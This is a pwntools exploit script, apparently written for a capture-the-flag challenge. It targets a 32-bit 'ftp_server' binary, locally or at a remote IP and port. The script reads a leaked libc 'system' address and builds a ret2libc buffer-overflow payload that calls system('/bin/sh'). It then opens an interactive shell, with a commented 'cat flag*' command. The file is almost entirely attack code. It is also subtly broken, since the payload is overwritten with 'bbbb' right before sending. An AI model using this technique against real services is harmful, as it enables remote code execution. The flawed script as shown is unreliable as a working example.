from pwn import *
from icecream import ic

elf = exe = ELF("./ftp_server")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("34.141.1.253", 30406)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x080492ea
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()


sl(b'a')
ru("at: ")
ret = 0x0804900e
system = int(rl().strip(), 16)
binsh = system + 0x174f65
payload = b'a'*0x50
payload += p32(ret)
payload += p32(system)
payload += p32(0)
payload += p32(binsh)
payload = b'bbbb'
sl(payload)
# sl(b'cat flag*')
io.interactive()
